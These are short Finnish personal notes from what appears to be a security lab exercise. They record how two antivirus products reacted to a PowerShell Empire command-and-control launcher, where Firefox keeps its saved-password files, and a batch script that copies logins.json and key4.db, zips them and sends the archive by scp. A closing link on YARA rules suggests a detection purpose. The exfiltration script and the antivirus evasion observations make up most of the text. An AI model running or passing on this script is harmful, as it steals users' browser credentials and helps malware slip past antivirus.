# Tommin muistiinpanot:

### HTTPS kuuntelijalla PowerShell Empire

Avira antoi PowerShell Empiren launcher.batin pyörähtää nätisti, mutta yhteys ei auennut.  
Kaspersky pysäytti scriptin samantien.  

### Firefox salasanat
Firefox password location:  
C:\Users\IEUser\AppData\Roaming\Mozilla\Firefox\Profiles\l9ukvzcl.default\logins.json  

Firefox password decryption:  
C:\Users\IEUser\AppData\Roaming\Mozilla\Firefox\Profiles\l9ukvzcl.default\ķey4.db  
  
Key.db numero vaihtelee
  
Salasanojen kopiointi:
```
mkdir C:\salasanat\
powershell Copy-Item -Path C:\Users\IEUser\AppData\Roaming\Mozilla\Firefox\Profiles\*.*\logins.json -Destination C:\salasanat\
powershell Copy-Item -Path C:\Users\IEUser\AppData\Roaming\Mozilla\Firefox\Profiles\*.*\key*.db -Destination C:\salasanat\
pause
powershell Compress-Archive -Path C:\salasanat -DestinationPath C:\salasanat\salasanat.zip
pause
scp C:\salasanat\salasanat.zip restricted@127.0.0.1:/home/restricted/.
pause
```

Sääntöjen teko:
https://seanthegeek.net/257/install-yara-write-yara-rules/
